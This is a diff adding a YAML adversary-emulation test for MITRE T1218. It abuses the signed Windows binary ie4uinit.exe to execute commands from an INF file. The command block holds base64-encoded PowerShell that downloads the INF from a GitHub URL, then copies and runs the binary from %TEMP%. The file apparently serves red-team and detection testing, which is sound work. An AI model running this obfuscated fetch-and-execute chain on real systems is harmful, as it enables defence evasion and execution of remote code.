@@ -1,0 +1,27 @@
+- id: 67ba81a0-c093-52ac-9f45-e9547e2c623c
+  name: Soumaia ART Tests - Lolbas ie4uinit.exe use as proxy
+  description: 'Executes commands from a specially prepared ie4uinit.inf file.
+
+    Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/'
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGkAZQB1AGkAbgBpAHQALgBpAG4AZgAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABpAGUAdQBpAG4AaQB0AC4AaQBuAGYAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAvAHMAcgBjAC8AaQBlAHUAaQBuAGkAdAAuAGkAbgBmACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABpAGUAdQBpAG4AaQB0AC4AaQBuAGYAIgAKAA==
+          )
+          copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe
+          copy ".\ieuinit.inf" %TEMP%\ieuinit.inf
+          %TEMP%\ie4uinit.exe -BaseSettings
+        cleanup: |-
+          del %TEMP%\ie4uinit.exe >nul 2>&1
+          del %TEMP%\ieuinit.inf >nul 2>&1
+        payloads:
+        - ieuinit.inf
